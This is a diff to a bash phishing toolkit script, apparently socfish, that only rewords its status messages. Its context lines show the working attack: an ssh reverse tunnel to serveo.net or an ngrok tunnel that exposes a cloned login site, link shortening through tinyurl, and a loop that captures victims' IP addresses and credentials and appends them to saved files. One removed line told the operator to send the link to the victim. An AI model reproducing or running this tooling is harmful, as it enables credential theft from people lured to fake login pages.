@@ -222,7 +222,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 cat ~/socfish/sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for targets...\e[0m\n"
 
 }
 
@@ -307,7 +307,7 @@ fi
 ##
 printf "\n"
 rm -rf iptracker.log
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for targets...\e[0m\n"
 
 }
 
@@ -324,9 +324,9 @@ fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 sleep 10
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
+printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s \n' $send_link
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Direct link (tinyurl):\e[0m\e[1;77m %s \n' $send_ip
 checkfound
 
 
@@ -368,7 +368,7 @@ sleep 0
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Downloading ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -406,7 +406,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the victim:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
 
@@ -417,8 +417,8 @@ fi
 
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Serveo\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose portfwd service: \e[0m\en' option_server
 option_server="${option_server:-${default_option_server}}"
@@ -435,18 +435,19 @@ fi
 }
 checkfound() {
 
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and Credentials...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "sites/$server/ip.txt" ]]; then
-printf "\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Target opened the link!\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] IP found!\n"
 catch_ip
 rm -rf sites/$server/ip.txt
 fi
 sleep 0.5
 if [[ -e "sites/$server/usernames.txt" ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+printf "\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials found!\n"
 catch_cred
 rm -rf sites/$server/usernames.txt
 fi
@@ -459,4 +460,3 @@ done
 banner
 dependencies
 menu
-
